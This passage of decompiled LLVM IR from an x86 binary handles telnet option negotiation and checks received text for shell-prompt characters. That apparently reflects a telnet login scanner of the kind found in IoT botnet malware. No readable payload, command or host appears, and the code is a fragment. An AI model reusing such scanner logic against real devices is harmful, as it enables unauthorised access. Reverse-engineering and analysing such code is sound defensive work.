  store i32 %v3_8051374, i32* %eax.global-to-local, align 4
  %v0_8051379 = load i32, i32* @esp, align 4
  %v1_8051379 = add i32 %v0_8051379, -4
  %v2_8051379 = inttoptr i32 %v1_8051379 to i32*
  store i32 16384, i32* %v2_8051379, align 4
  %v1_805137e = add i32 %v0_8051379, 1888
  %v2_805137e = inttoptr i32 %v1_805137e to i32*
  %v3_805137e = load i32, i32* %v2_805137e, align 4
  store i32 %v3_805137e, i32* @esi, align 4
  %v2_8051385 = add i32 %v0_8051379, -8
  %v3_8051385 = inttoptr i32 %v2_8051385 to i32*
  store i32 %v3_805137e, i32* %v3_8051385, align 4
  %v2_8051386 = add i32 %v0_8051379, -12
  %v3_8051386 = inttoptr i32 %v2_8051386 to i32*
  store i32 %v3_8051374, i32* %v3_8051386, align 4
  %v0_8051387 = load i32, i32* @edi, align 4
  %v1_8051387 = add i32 %v0_8051387, 4
  %v2_8051387 = inttoptr i32 %v1_8051387 to i32*
  %v3_8051387 = load i32, i32* %v2_8051387, align 4
  store i32 %v3_8051387, i32* @ebx, align 4
  %v2_805138a = add i32 %v0_8051379, -16
  %v3_805138a = inttoptr i32 %v2_805138a to i32*
  store i32 %v3_8051387, i32* %v3_805138a, align 4
  %v0_805138b = call i32 @function_80532c4()
  store i32 %v0_805138b, i32* %eax.global-to-local, align 4
  %v0_8051390 = load i32, i32* @esp, align 4
  %v1_8051393 = add i32 %v0_8051390, 28
  %v2_8051393 = inttoptr i32 %v1_8051393 to i32*
  store i32 16384, i32* %v2_8051393, align 4
  %v1_8051398 = add i32 %v0_8051390, 24
  %v2_8051398 = inttoptr i32 %v1_8051398 to i32*
  store i32 2, i32* %v2_8051398, align 4
  %v1_805139a = add i32 %v0_8051390, 20
  %v2_805139a = inttoptr i32 %v1_805139a to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v2_805139a, align 4
  %v0_805139f = load i32, i32* @edi, align 4
  %v1_805139f = add i32 %v0_805139f, 4
  %v2_805139f = inttoptr i32 %v1_805139f to i32*
  %v3_805139f = load i32, i32* %v2_805139f, align 4
  store i32 %v3_805139f, i32* %ecx.global-to-local, align 4
  %v2_80513a2 = add i32 %v0_8051390, 16
  %v3_80513a2 = inttoptr i32 %v2_80513a2 to i32*
  store i32 %v3_805139f, i32* %v3_80513a2, align 4
  %v0_80513a3 = call i32 @function_80532c4()
  store i32 %v0_80513a3, i32* %eax.global-to-local, align 4
  %v0_80513a8 = load i32, i32* @esp, align 4
  %v1_80513a8 = inttoptr i32 %v0_80513a8 to i32*
  store i32 20, i32* %v1_80513a8, align 4
  %v2_80513af = call i32 @function_8051c10(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80513af, i32* %eax.global-to-local, align 4
  %v0_80513b7 = load i32, i32* @edi, align 4
  %v1_80513b7 = add i32 %v0_80513b7, 12
  %v2_80513b7 = inttoptr i32 %v1_80513b7 to i32*
  store i32 8, i32* %v2_80513b7, align 4
  br label %dec_label_pc_80512e1

dec_label_pc_80513c3:                             ; preds = %dec_label_pc_8050fe4
  %v1_80513c3 = add i32 %v0_8050fe4, 24
  %v2_80513c3 = inttoptr i32 %v1_80513c3 to i32*
  %v3_80513c3 = load i32, i32* %v2_80513c3, align 4
  %v1_80513c6 = add i32 %v3_80513c3, -1
  store i32 %v1_80513c6, i32* %eax.global-to-local, align 4
  %tmp147 = icmp slt i32 %v1_80513c6, 1
  br i1 %tmp147, label %dec_label_pc_8050f72.loopexit12.loopexit, label %dec_label_pc_80513cf.preheader

dec_label_pc_80513cf.preheader:                   ; preds = %dec_label_pc_80513c3
  %v7_80513cf.pre = load i32, i32* @edx, align 4
  %v2_80513cf = add i32 %v0_8050fe4, 28
  br label %dec_label_pc_80513cf

dec_label_pc_80513cf:                             ; preds = %dec_label_pc_80513cf.preheader, %dec_label_pc_8051400
  %v7_80513cf = phi i32 [ %v7_80513cf.pre, %dec_label_pc_80513cf.preheader ], [ %v9_80513cf, %dec_label_pc_8051400 ]
  %v0_8051676 = phi i32 [ %v1_80513c6, %dec_label_pc_80513cf.preheader ], [ %v1_8051400, %dec_label_pc_8051400 ]
  %v3_80513cf = add i32 %v2_80513cf, %v0_8051676
  %v4_80513cf = inttoptr i32 %v3_80513cf to i8*
  %v5_80513cf = load i8, i8* %v4_80513cf, align 1
  %v6_80513cf = zext i8 %v5_80513cf to i32
  %v8_80513cf = and i32 %v7_80513cf, -256
  %v9_80513cf = or i32 %v6_80513cf, %v8_80513cf
  store i32 %v9_80513cf, i32* %edx.global-to-local, align 4
  %v10_80513d3 = icmp eq i8 %v5_80513cf, 58
  br i1 %v10_80513d3, label %dec_label_pc_8051676, label %dec_label_pc_80513dc

dec_label_pc_80513dc:                             ; preds = %dec_label_pc_80513cf
  %v10_80513dc = icmp eq i8 %v5_80513cf, 62
  br i1 %v10_80513dc, label %dec_label_pc_8051676, label %dec_label_pc_80513e5

dec_label_pc_80513e5:                             ; preds = %dec_label_pc_80513dc
  %v10_80513e5 = icmp eq i8 %v5_80513cf, 36
  br i1 %v10_80513e5, label %dec_label_pc_8051676, label %dec_label_pc_80513ee

dec_label_pc_80513ee:                             ; preds = %dec_label_pc_80513e5
  %v10_80513ee = icmp eq i8 %v5_80513cf, 35
  br i1 %v10_80513ee, label %dec_label_pc_8051676, label %dec_label_pc_80513f7

dec_label_pc_80513f7:                             ; preds = %dec_label_pc_80513ee
  %v10_80513f7 = icmp eq i8 %v5_80513cf, 37
  br i1 %v10_80513f7, label %dec_label_pc_8051676, label %dec_label_pc_8051400

dec_label_pc_8051400:                             ; preds = %dec_label_pc_80513f7
  %v1_8051400 = add i32 %v0_8051676, -1
  %v8_8051400 = icmp eq i32 %v1_8051400, 0
  store i32 %v1_8051400, i32* %eax.global-to-local, align 4
  %v1_8051401 = icmp eq i1 %v8_8051400, false
  br i1 %v1_8051401, label %dec_label_pc_80513cf, label %dec_label_pc_8050f72.backedge

dec_label_pc_8051408:                             ; preds = %dec_label_pc_8051013
  %v1_8051408 = add i32 %v0_8051001, 2
  store i32 %v1_8051408, i32* @ebx, align 4
  %v1_805140b = add i32 %v0_805140b, 2
  store i32 %v1_805140b, i32* @ebp, align 4
  br label %dec_label_pc_8050ffd.backedge

dec_label_pc_8050ffd.backedge:                    ; preds = %dec_label_pc_8051408, %dec_label_pc_805182a
  %v0_805107b128 = phi i32 [ %v0_805107b129, %dec_label_pc_8051408 ], [ %v0_8051863, %dec_label_pc_805182a ]
  %v1_8050ffd = phi i32 [ %v1_805100d, %dec_label_pc_8051408 ], [ %v3_8051863, %dec_label_pc_805182a ]
  %v0_8050ffd = phi i32 [ %v1_805140b, %dec_label_pc_8051408 ], [ %v0_8050ffd.pre, %dec_label_pc_805182a ]
  %v5_8051013109 = phi i32 [ %v7_8051013, %dec_label_pc_8051408 ], [ %v0_805185b, %dec_label_pc_805182a ]
  %v0_8051006104 = phi i32 [ %v0_8051420, %dec_label_pc_8051408 ], [ %v1_8051860, %dec_label_pc_805182a ]
  %v2_8050ffd = sub i32 %v0_8050ffd, %v1_8050ffd
  %v8_8050ffd = xor i32 %v0_8050ffd, %v1_8050ffd
  %v9_8050ffd = xor i32 %v2_8050ffd, %v0_8050ffd
  %v10_8050ffd = and i32 %v9_8050ffd, %v8_8050ffd
  %v11_8050ffd = icmp slt i32 %v10_8050ffd, 0
  %v13_8050ffd = icmp slt i32 %v2_8050ffd, 0
  %v2_8050fff = icmp eq i1 %v13_8050ffd, %v11_8050ffd
  br i1 %v2_8050fff, label %dec_label_pc_8051073, label %dec_label_pc_8051001.preheader

dec_label_pc_8051413:                             ; preds = %dec_label_pc_8051682, %dec_label_pc_8051356, %dec_label_pc_8051294, %dec_label_pc_8051609, %dec_label_pc_80516fb, %dec_label_pc_80515b7, %dec_label_pc_8051566, %dec_label_pc_8051073, %dec_label_pc_8051774
  %v0_8051413 = phi i32 [ %v1_8051676, %dec_label_pc_8051682 ], [ %v1_805134a160, %dec_label_pc_8051356 ], [ %v0_805128b, %dec_label_pc_8051294 ], [ %v1_80515fd, %dec_label_pc_8051609 ], [ %v1_80516ef, %dec_label_pc_80516fb ], [ %v0_80515b7, %dec_label_pc_80515b7 ], [ %v0_8051566, %dec_label_pc_8051566 ], [ %v0_8051073, %dec_label_pc_8051073 ], [ %v1_8051768, %dec_label_pc_8051774 ]
  %v1_8051413 = icmp eq i32 %v0_8051413, 0
  %v1_8051415 = icmp eq i1 %v1_8051413, false
  br i1 %v1_8051415, label %dec_label_pc_80512e1, label %dec_label_pc_8050f72.loopexit12.loopexit

dec_label_pc_8051420:                             ; preds = %dec_label_pc_805101e
  %v1_8051420 = add i32 %v0_8051420, 1879
  %v2_8051420 = inttoptr i32 %v1_8051420 to i8*
  store i8 -1, i8* %v2_8051420, align 1
  %v0_8051428 = load i32, i32* @esp, align 4
  %v1_8051428 = add i32 %v0_8051428, 1880
  %v2_8051428 = inttoptr i32 %v1_8051428 to i8*
  store i8 -5, i8* %v2_8051428, align 1
  %v0_8051430 = load i32, i32* @esp, align 4
  %v1_8051430 = add i32 %v0_8051430, 1881
  %v2_8051430 = inttoptr i32 %v1_8051430 to i8*
  store i8 31, i8* %v2_8051430, align 1
  %v0_8051438 = load i32, i32* @esp, align 4
  %v1_8051438 = add i32 %v0_8051438, 1847
  %v2_8051438 = inttoptr i32 %v1_8051438 to i8*
  store i8 -1, i8* %v2_8051438, align 1
  %v0_8051440 = load i32, i32* @esp, align 4
  %v1_8051440 = add i32 %v0_8051440, 1848
  %v2_8051440 = inttoptr i32 %v1_8051440 to i8*
  store i8 -6, i8* %v2_8051440, align 1
  %v0_8051448 = load i32, i32* @esp, align 4
  %v1_8051448 = add i32 %v0_8051448, 1849
  %v2_8051448 = inttoptr i32 %v1_8051448 to i8*
  store i8 31, i8* %v2_8051448, align 1
  %v0_8051450 = load i32, i32* @esp, align 4
  %v1_8051450 = add i32 %v0_8051450, 1850
  %v2_8051450 = inttoptr i32 %v1_8051450 to i8*
  store i8 0, i8* %v2_8051450, align 1
  %v0_8051458 = load i32, i32* @esp, align 4
  %v1_8051458 = add i32 %v0_8051458, 1851
  %v2_8051458 = inttoptr i32 %v1_8051458 to i8*
  store i8 80, i8* %v2_8051458, align 1
  %v0_8051460 = load i32, i32* @esp, align 4
  %v1_8051460 = add i32 %v0_8051460, 1852
  %v2_8051460 = inttoptr i32 %v1_8051460 to i8*
  store i8 0, i8* %v2_8051460, align 1
  %v0_8051468 = load i32, i32* @esp, align 4
  %v1_8051468 = add i32 %v0_8051468, 1853
  %v2_8051468 = inttoptr i32 %v1_8051468 to i8*
  store i8 24, i8* %v2_8051468, align 1
  %v0_8051470 = load i32, i32* @esp, align 4
  %v1_8051470 = add i32 %v0_8051470, 1854
  %v2_8051470 = inttoptr i32 %v1_8051470 to i8*
  store i8 -1, i8* %v2_8051470, align 1
  %v0_8051478 = load i32, i32* @esp, align 4
  %v1_8051478 = add i32 %v0_8051478, 1855
  %v2_8051478 = inttoptr i32 %v1_8051478 to i8*
  store i8 -16, i8* %v2_8051478, align 1
  %v0_8051480 = load i32, i32* @esp, align 4
  %v1_8051480 = add i32 %v0_8051480, 16
  %v2_8051480 = inttoptr i32 %v1_8051480 to i32*
  %v3_8051480 = load i32, i32* %v2_8051480, align 4
  store i32 %v3_8051480, i32* %eax.global-to-local, align 4
  %v0_8051484 = load i32, i32* @edi, align 4
  %v1_8051484 = add i32 %v0_8051484, 24
  %v2_8051484 = inttoptr i32 %v1_8051484 to i32*
  %v3_8051484 = load i32, i32* %v2_8051484, align 4
  store i32 %v3_8051484, i32* %ecx.global-to-local, align 4
  %v0_8051487 = load i32, i32* @ebx, align 4
  %v1_8051487 = add i32 %v0_8051487, 2
  store i32 %v1_8051487, i32* %edx.global-to-local, align 4
  %v2_805148a = add i32 %v3_8051484, %v3_8051480
  store i32 %v2_805148a, i32* %eax.global-to-local, align 4
  %tmp299 = icmp ugt i32 %v2_805148a, %v1_8051487
  br i1 %tmp299, label %dec_label_pc_8051494, label %dec_label_pc_8051420.dec_label_pc_8051073.loopexit_crit_edge

dec_label_pc_8051420.dec_label_pc_8051073.loopexit_crit_edge: ; preds = %dec_label_pc_8051420
  %v0_8051073.pre.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8051073

dec_label_pc_8051494:                             ; preds = %dec_label_pc_8051420
  %v2_8051494 = inttoptr i32 %v1_8051487 to i8*
  %v3_8051494 = load i8, i8* %v2_8051494, align 1
  %v12_8051494 = icmp eq i8 %v3_8051494, 31
  br i1 %v12_8051494, label %dec_label_pc_805182a, label %dec_label_pc_805149e

dec_label_pc_805149e:                             ; preds = %dec_label_pc_8051494
  %v1_805149e = inttoptr i32 %v0_8051487 to i8*
  %v2_805149e = load i8, i8* %v1_805149e, align 1
  %v3_805149e = zext i8 %v2_805149e to i32
  %v5_805149e = and i32 %v2_805148a, -256
  %v6_805149e = or i32 %v3_805149e, %v5_805149e
  store i32 %v6_805149e, i32* %eax.global-to-local, align 4
  %v11_80514a0 = icmp eq i8 %v2_805149e, -3
  %v1_80514a2 = icmp eq i1 %v11_80514a0, false
  br i1 %v1_80514a2, label %dec_label_pc_80519f3, label %dec_label_pc_80514a8

dec_label_pc_80514a8:                             ; preds = %dec_label_pc_805149e
  store i8 -4, i8* %v1_805149e, align 1
  %v0_80514ab = load i32, i32* @esi, align 4
  %v1_80514ab = inttoptr i32 %v0_80514ab to i8*
  %v2_80514ab = load i8, i8* %v1_80514ab, align 1
  %v3_80514ab = zext i8 %v2_80514ab to i32
  %v4_80514ab = load i32, i32* %eax.global-to-local, align 4
  %v5_80514ab = and i32 %v4_80514ab, -256
  %v6_80514ab = or i32 %v5_80514ab, %v3_80514ab
  store i32 %v6_80514ab, i32* %eax.global-to-local, align 4
  %v11_80514ad = icmp eq i8 %v2_80514ab, -3
  %v1_80514af = icmp eq i1 %v11_80514ad, false
  br i1 %v1_80514af, label %dec_label_pc_8051037, label %dec_label_pc_80514b5

dec_label_pc_80514b5:                             ; preds = %dec_label_pc_80514a8, %dec_label_pc_805102d
  %v0_80514b5 = phi i32 [ %v0_80514ab, %dec_label_pc_80514a8 ], [ %v0_805102d, %dec_label_pc_805102d ]
  %v1_80514b5 = inttoptr i32 %v0_80514b5 to i8*
  store i8 -4, i8* %v1_80514b5, align 1
  %v0_80514b8 = load i32, i32* @ebx, align 4
  %v1_80514b8 = add i32 %v0_80514b8, 2
  %v2_80514b8 = inttoptr i32 %v1_80514b8 to i8*
  %v3_80514b8 = load i8, i8* %v2_80514b8, align 1
  %v4_80514b8 = zext i8 %v3_80514b8 to i32
  %v5_80514b8 = load i32, i32* %eax.global-to-local, align 4
  %v6_80514b8 = and i32 %v5_80514b8, -256
  %v7_80514b8 = or i32 %v6_80514b8, %v4_80514b8
  store i32 %v7_80514b8, i32* %eax.global-to-local, align 4
  %v11_80514bb = icmp eq i8 %v3_80514b8, -3
  %v1_80514bd = icmp eq i1 %v11_80514bb, false
  br i1 %v1_80514bd, label %dec_label_pc_805104a, label %dec_label_pc_80514c3

dec_label_pc_80514c3:                             ; preds = %dec_label_pc_80514b5, %dec_label_pc_805103f
  %v0_80514c3 = phi i32 [ %v0_80514b8, %dec_label_pc_80514b5 ], [ %v0_805103f, %dec_label_pc_805103f ]
  %v1_80514c3 = add i32 %v0_80514c3, 2
  %v2_80514c3 = inttoptr i32 %v1_80514c3 to i8*
  store i8 -4, i8* %v2_80514c3, align 1
  br label %dec_label_pc_8051052

dec_label_pc_80514cc:                             ; preds = %dec_label_pc_8050f8d
  %v1_8050fba = icmp eq i32 %v0_8050fb2, 0
  br i1 %v1_8050fba, label %dec_label_pc_80519d8, label %dec_label_pc_80514d2

dec_label_pc_80514d2:                             ; preds = %dec_label_pc_80514cc
  %v10_80514d2 = icmp eq i32 %v0_8050fb2, -1
  %v1_80514d5 = icmp eq i1 %v10_80514d2, false
  br i1 %v1_80514d5, label %dec_label_pc_8050fd4, label %dec_label_pc_80514db

dec_label_pc_80514db:                             ; preds = %dec_label_pc_80514d2
  %v1_80514db = add i32 %v0_8050fb7, 56
  %v2_80514db = inttoptr i32 %v1_80514db to i32*
  %v3_80514db = load i32, i32* %v2_80514db, align 4
  store i32 %v3_80514db, i32* %edx.global-to-local, align 4
  %v1_80514df = inttoptr i32 %v3_80514db to i32*
  %v2_80514df = load i32, i32* %v1_80514df, align 4
  %v11_80514df = icmp eq i32 %v2_80514df, 11
  br i1 %v11_80514df, label %dec_label_pc_8050f1b, label %dec_label_pc_80514e8

dec_label_pc_80514e8:                             ; preds = %dec_label_pc_80514db, %dec_label_pc_80519d8
  %v0_80514e8 = phi i32 [ %v1_8050fb7, %dec_label_pc_80514db ], [ %v0_80514e8.pre, %dec_label_pc_80519d8 ]
  %v0_80514eb = load i32, i32* @edi, align 4
  %v1_80514eb = add i32 %v0_80514eb, 4
  %v2_80514eb = inttoptr i32 %v1_80514eb to i32*
  %v3_80514eb = load i32, i32* %v2_80514eb, align 4
  store i32 %v3_80514eb, i32* @esi, align 4
  %v2_80514ee = add i32 %v0_80514e8, -16
  %v3_80514ee = inttoptr i32 %v2_80514ee to i32*
  store i32 %v3_80514eb, i32* %v3_80514ee, align 4
  %v1_80514ef = call i32 @function_8052b81(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_80514ef, i32* %eax.global-to-local, align 4
  %v0_80514f4 = load i32, i32* @edi, align 4
  %v1_80514f4 = add i32 %v0_80514f4, 284
  %v2_80514f4 = inttoptr i32 %v1_80514f4 to i8*
  %v3_80514f4 = load i8, i8* %v2_80514f4, align 1
  %v4_80514f4 = zext i8 %v3_80514f4 to i32
  %v6_80514f4 = and i32 %v1_80514ef, -256
  %v7_80514f4 = or i32 %v4_80514f4, %v6_80514f4
  %v1_80514fd = add i32 %v7_80514f4, 1
  store i32 %v1_80514fd, i32* %eax.global-to-local, align 4
  %v1_80514fe = add i32 %v0_80514f4, 4
  %v2_80514fe = inttoptr i32 %v1_80514fe to i32*
  store i32 -1, i32* %v2_80514fe, align 4
  %v0_8051505 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051505 = trunc i32 %v0_8051505 to i8
  %v2_8051505 = load i32, i32* @edi, align 4
  %v3_8051505 = add i32 %v2_8051505, 284
  %v4_8051505 = inttoptr i32 %v3_8051505 to i8*
  store i8 %v1_8051505, i8* %v4_8051505, align 1
  %v0_805150b = load i32, i32* %eax.global-to-local, align 4
  %v1_805150b = trunc i32 %v0_805150b to i8
  %tmp300 = icmp ult i8 %v1_805150b, 10
  %v0_80519e7 = load i32, i32* @edi, align 4
  br i1 %tmp300, label %dec_label_pc_80519e7, label %dec_label_pc_8051513

dec_label_pc_8051513:                             ; preds = %dec_label_pc_80514e8
  %v1_8051513 = add i32 %v0_80519e7, 284
  %v2_8051513 = inttoptr i32 %v1_8051513 to i8*
  store i8 0, i8* %v2_8051513, align 1
  %v0_805151a = load i32, i32* @edi, align 4
  %v1_805151a = add i32 %v0_805151a, 12
  %v2_805151a = inttoptr i32 %v1_805151a to i32*
  store i32 0, i32* %v2_805151a, align 4
  br label %dec_label_pc_8050f1b

dec_label_pc_8051526:                             ; preds = %dec_label_pc_8051037
  %v1_8051526 = inttoptr i32 %v0_8051526 to i8*
  store i8 -3, i8* %v1_8051526, align 1
  %v5_805103f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805103f

dec_label_pc_805152e:                             ; preds = %dec_label_pc_805104a
  %v1_805152e = add i32 %v0_805152e, 2
  %v2_805152e = inttoptr i32 %v1_805152e to i8*
  store i8 -3, i8* %v2_805152e, align 1
  br label %dec_label_pc_8051052

dec_label_pc_8051537:                             ; preds = %dec_label_pc_8050f79
  %v0_8051537 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8051537, i32* %edx.global-to-local, align 4
  %v1_8051539 = load i32, i32* @esp, align 4
  %v2_8051539 = add i32 %v1_8051539, -4
  %v3_8051539 = inttoptr i32 %v2_8051539 to i32*
  store i32 %v0_8051537, i32* %v3_8051539, align 4
  %v0_805153a = load i32, i32* @edi, align 4
  %v1_805153a = add i32 %v0_805153a, 92
  store i32 %v1_805153a, i32* %eax.global-to-local, align 4
  %v1_805153d = add i32 %v1_8051539, -8
  %v2_805153d = inttoptr i32 %v1_805153d to i32*
  store i32 192, i32* %v2_805153d, align 4
  %v0_8051542 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051542 = add i32 %v1_8051539, -12
  %v3_8051542 = inttoptr i32 %v2_8051542 to i32*
  store i32 %v0_8051542, i32* %v3_8051542, align 4
  %v0_8051543 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051543 = add i32 %v1_8051539, -16
  %v3_8051543 = inttoptr i32 %v2_8051543 to i32*
  store i32 %v0_8051543, i32* %v3_8051543, align 4
  %v4_8051544 = call i32 @function_80530e3(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8051544, i32* %eax.global-to-local, align 4
  %v0_8051549 = load i32, i32* @edi, align 4
  %v1_8051549 = add i32 %v0_8051549, 24
  %v2_8051549 = inttoptr i32 %v1_8051549 to i32*
  %v3_8051549 = load i32, i32* %v2_8051549, align 4
  %v1_805154c = add i32 %v3_8051549, -64
  store i32 %v1_805154c, i32* %eax.global-to-local, align 4
  store i32 %v1_805154c, i32* %v2_8051549, align 4
  br label %dec_label_pc_8050f8d

dec_label_pc_805155a:                             ; preds = %dec_label_pc_80510b9, %dec_label_pc_80510b0, %dec_label_pc_80510a7, %dec_label_pc_805109e, %dec_label_pc_8051091
  %v1_805155a = add i32 %v0_805155a, 1
  store i32 %v1_805155a, i32* @ebp, align 4
  %v10_805155d = icmp eq i32 %v0_805155a, -2
  br i1 %v10_805155d, label %dec_label_pc_80510c5, label %dec_label_pc_8051566

dec_label_pc_8051566:                             ; preds = %dec_label_pc_805155a, %dec_label_pc_80510e5, %dec_label_pc_80510c5
  %v0_8051566 = phi i32 [ %v1_805155a, %dec_label_pc_805155a ], [ %v0_80510f5, %dec_label_pc_80510e5 ], [ %v0_80510d2, %dec_label_pc_80510c5 ]
  %tmp148 = icmp slt i32 %v0_8051566, 1
  br i1 %tmp148, label %dec_label_pc_8051413, label %dec_label_pc_805156e

dec_label_pc_805156e:                             ; preds = %dec_label_pc_8051566
  %v0_805156e = load i32, i32* @edi, align 4
  %v1_805156e = inttoptr i32 %v0_805156e to i32*
  %v2_805156e = load i32, i32* %v1_805156e, align 4
  store i32 %v2_805156e, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8051572 = load i32, i32* @esp, align 4
  %v1_8051572 = add i32 %v0_8051572, -4
  %v2_8051572 = inttoptr i32 %v1_8051572 to i32*
  store i32 16384, i32* %v2_8051572, align 4
  %v0_8051577 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051577 = add i32 %v0_8051577, 12
  %v2_8051577 = inttoptr i32 %v1_8051577 to i8*
  %v3_8051577 = load i8, i8* %v2_8051577, align 1
  %v4_8051577 = zext i8 %v3_8051577 to i32
  %v5_8051577 = load i32, i32* %eax.global-to-local, align 4
  %v6_8051577 = and i32 %v5_8051577, -256
  %v7_8051577 = or i32 %v6_8051577, %v4_8051577
  store i32 %v7_8051577, i32* %eax.global-to-local, align 4
  %v2_805157a = add i32 %v0_8051572, -8
  %v3_805157a = inttoptr i32 %v2_805157a to i32*
  store i32 %v7_8051577, i32* %v3_805157a, align 4
  %v0_805157b = load i32, i32* %edx.global-to-local, align 4
  %v1_805157b = inttoptr i32 %v0_805157b to i32*
  %v2_805157b = load i32, i32* %v1_805157b, align 4
  store i32 %v2_805157b, i32* %eax.global-to-local, align 4
  %v2_805157d = add i32 %v0_8051572, -12
  %v3_805157d = inttoptr i32 %v2_805157d to i32*
  store i32 %v2_805157b, i32* %v3_805157d, align 4
  %v0_805157e = load i32, i32* @edi, align 4
  %v1_805157e = add i32 %v0_805157e, 4
  %v2_805157e = inttoptr i32 %v1_805157e to i32*
  %v3_805157e = load i32, i32* %v2_805157e, align 4
  store i32 %v3_805157e, i32* %eax.global-to-local, align 4
  %v2_8051581 = add i32 %v0_8051572, -16
  %v3_8051581 = inttoptr i32 %v2_8051581 to i32*
  store i32 %v3_805157e, i32* %v3_8051581, align 4
  %v0_8051582 = call i32 @function_80532c4()
  store i32 %v0_8051582, i32* %eax.global-to-local, align 4
  %v0_8051587 = load i32, i32* @esp, align 4
  %v1_8051587 = add i32 %v0_8051587, -4
  %v2_8051587 = inttoptr i32 %v1_8051587 to i32*
  store i32 16384, i32* %v2_8051587, align 4
  %v1_805158c = add i32 %v0_8051587, -8
  %v2_805158c = inttoptr i32 %v1_805158c to i32*
  store i32 2, i32* %v2_805158c, align 4
  %v1_805158e = add i32 %v0_8051587, -12
  %v2_805158e = inttoptr i32 %v1_805158e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v2_805158e, align 4
  %v0_8051593 = load i32, i32* @edi, align 4
  %v1_8051593 = add i32 %v0_8051593, 4
  %v2_8051593 = inttoptr i32 %v1_8051593 to i32*
  %v3_8051593 = load i32, i32* %v2_8051593, align 4
  store i32 %v3_8051593, i32* %eax.global-to-local, align 4
  %v2_8051596 = add i32 %v0_8051587, -16
  %v3_8051596 = inttoptr i32 %v2_8051596 to i32*
  store i32 %v3_8051593, i32* %v3_8051596, align 4
  %v0_8051597 = call i32 @function_80532c4()
  store i32 %v0_8051597, i32* %eax.global-to-local, align 4
  %v0_805159f = load i32, i32* @edi, align 4
  %v1_805159f = add i32 %v0_805159f, 12
  %v2_805159f = inttoptr i32 %v1_805159f to i32*
  store i32 4, i32* %v2_805159f, align 4
  br label %dec_label_pc_80512e1

dec_label_pc_80515ab:                             ; preds = %dec_label_pc_8051139, %dec_label_pc_8051130, %dec_label_pc_8051127, %dec_label_pc_805111a
  %v1_80515ab = add i32 %v0_80515ab, 1
  store i32 %v1_80515ab, i32* @ebp, align 4
  %v10_80515ae = icmp eq i32 %v0_80515ab, -2
  br i1 %v10_80515ae, label %dec_label_pc_8051145, label %dec_label_pc_80515b7

dec_label_pc_80515b7:                             ; preds = %dec_label_pc_80515ab, %dec_label_pc_8051145
  %v0_80515b7 = phi i32 [ %v1_80515ab, %dec_label_pc_80515ab ], [ %v0_8051152, %dec_label_pc_8051145 ]
  %tmp149 = icmp slt i32 %v0_80515b7, 1
  br i1 %tmp149, label %dec_label_pc_8051413, label %dec_label_pc_80515bf

dec_label_pc_80515bf:                             ; preds = %dec_label_pc_80515b7
  %v0_80515bf = load i32, i32* @edi, align 4
  %v1_80515bf = inttoptr i32 %v0_80515bf to i32*
  %v2_80515bf = load i32, i32* %v1_80515bf, align 4
  store i32 %v2_80515bf, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80515c3 = load i32, i32* @esp, align 4
  %v1_80515c3 = add i32 %v0_80515c3, -4
  %v2_80515c3 = inttoptr i32 %v1_80515c3 to i32*
  store i32 16384, i32* %v2_80515c3, align 4
  %v0_80515c8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80515c8 = add i32 %v0_80515c8, 13
  %v2_80515c8 = inttoptr i32 %v1_80515c8 to i8*
  %v3_80515c8 = load i8, i8* %v2_80515c8, align 1
  %v4_80515c8 = zext i8 %v3_80515c8 to i32
  %v5_80515c8 = load i32, i32* %eax.global-to-local, align 4
  %v6_80515c8 = and i32 %v5_80515c8, -256
  %v7_80515c8 = or i32 %v6_80515c8, %v4_80515c8
  store i32 %v7_80515c8, i32* %eax.global-to-local, align 4
  %v2_80515cb = add i32 %v0_80515c3, -8
  %v3_80515cb = inttoptr i32 %v2_80515cb to i32*
  store i32 %v7_80515c8, i32* %v3_80515cb, align 4
  %v0_80515cc = load i32, i32* %edx.global-to-local, align 4
  %v1_80515cc = add i32 %v0_80515cc, 4
  %v2_80515cc = inttoptr i32 %v1_80515cc to i32*
  %v3_80515cc = load i32, i32* %v2_80515cc, align 4
  store i32 %v3_80515cc, i32* @esi, align 4
  %v2_80515cf = add i32 %v0_80515c3, -12
  %v3_80515cf = inttoptr i32 %v2_80515cf to i32*
  store i32 %v3_80515cc, i32* %v3_80515cf, align 4
  %v0_80515d0 = load i32, i32* @edi, align 4
  %v1_80515d0 = add i32 %v0_80515d0, 4
  %v2_80515d0 = inttoptr i32 %v1_80515d0 to i32*
  %v3_80515d0 = load i32, i32* %v2_80515d0, align 4
  store i32 %v3_80515d0, i32* @ebx, align 4
  %v2_80515d3 = add i32 %v0_80515c3, -16
  %v3_80515d3 = inttoptr i32 %v2_80515d3 to i32*
  store i32 %v3_80515d0, i32* %v3_80515d3, align 4
  %v0_80515d4 = call i32 @function_80532c4()
  store i32 %v0_80515d4, i32* %eax.global-to-local, align 4
  %v0_80515d9 = load i32, i32* @esp, align 4
  %v1_80515d9 = add i32 %v0_80515d9, -4
  %v2_80515d9 = inttoptr i32 %v1_80515d9 to i32*
  store i32 16384, i32* %v2_80515d9, align 4
  %v1_80515de = add i32 %v0_80515d9, -8
  %v2_80515de = inttoptr i32 %v1_80515de to i32*
  store i32 2, i32* %v2_80515de, align 4
  %v1_80515e0 = add i32 %v0_80515d9, -12
  %v2_80515e0 = inttoptr i32 %v1_80515e0 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v2_80515e0, align 4
  %v0_80515e5 = load i32, i32* @edi, align 4
  %v1_80515e5 = add i32 %v0_80515e5, 4
  %v2_80515e5 = inttoptr i32 %v1_80515e5 to i32*
  %v3_80515e5 = load i32, i32* %v2_80515e5, align 4
  store i32 %v3_80515e5, i32* %ecx.global-to-local, align 4
